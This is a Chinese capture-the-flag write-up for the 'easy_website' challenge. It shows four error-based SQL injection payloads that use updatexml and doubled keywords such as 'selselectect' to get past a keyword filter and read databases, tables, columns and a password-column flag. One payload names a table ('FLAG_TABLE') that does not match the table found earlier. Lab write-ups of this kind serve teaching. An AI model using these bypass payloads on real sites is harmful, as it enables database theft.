## easy_website

****

出题人：guoql



![image-20240413222740991](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413222740991.png)

题目删除了空格，过滤了union 和 select、password、information等

可以使用写绕过：uniunionon、selselectect、infoorrmation_schema来绕过限制，空格可使用 /\*\*/ 或 %09绕过

使用updatexml 基于报错将结果带出

```mysql
'oorr/**/updatexml(1,concat(0x7e,(selselectect/**/(schema_name)/**/from/**/infoorrmation_schema.schemata/**/limit/**/5,1),0x7e),1)#

```

爆库名为users

得知库名后猜解表名

```mysql
'oorr/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema='users'),0x7e),1)#

```

爆表名为users

得知表名后猜解列名

```mysql
'oorr/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema='users'/**/aandnd/**/table_name='FLAG_TABLE'),0x7e),1)#

```

爆列名为password

得知列名后查询flag

```mysql
'oorr/**/updatexml(1,concat(0x7e,(selselectect/**/(passwoorrd)/**/from/**/users.users/**/limit/**/2,1),0x7e),1)#

```

爆出flag



